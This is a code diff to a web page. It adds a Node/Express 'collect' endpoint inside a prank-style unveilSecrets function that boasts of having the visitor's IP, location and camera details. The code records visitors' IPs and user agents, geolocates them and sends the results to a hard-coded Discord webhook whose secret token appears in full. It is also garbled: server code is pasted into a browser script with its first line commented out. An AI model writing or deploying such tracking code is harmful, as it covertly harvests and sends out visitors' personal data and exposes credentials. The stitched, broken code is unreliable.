@@ -43,7 +43,45 @@
     <script>
         function unveilSecrets() {
             alert("Secrets unlocked! We now have your IP, location, OS, and camera access details.");
-            // You can add AJAX requests to send data to the backend here
+            // const express = require('express');
+const fetch = require('node-fetch');
+const bodyParser = require('body-parser');
+
+const app = express();
+app.use(bodyParser.json());
+
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1396421330399789146/qk3h6GUJlQ2DbAmy5uY0RooTHUju2bH7vsakTDMMbeDgsxLaiUeUZW9_M1J3ndeD-bJP';
+
+app.post('/collect', async (req, res) => {
+  try {
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geoData = await geoRes.json();
+
+    const location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
+
+    const message = {
+      content: `**Visitor Info:**\nIP: ${ip}\nLocation: ${location}\nUser-Agent: ${userAgent}\nTime: ${new Date().toISOString()}`
+    };
+
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(message),
+    });
+
+    res.json({ status: 'success' });
+  } catch (error) {
+    console.error('Error:', error);
+    res.status(500).json({ status: 'error', message: error.message });
+  }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
         }
     </script>
 
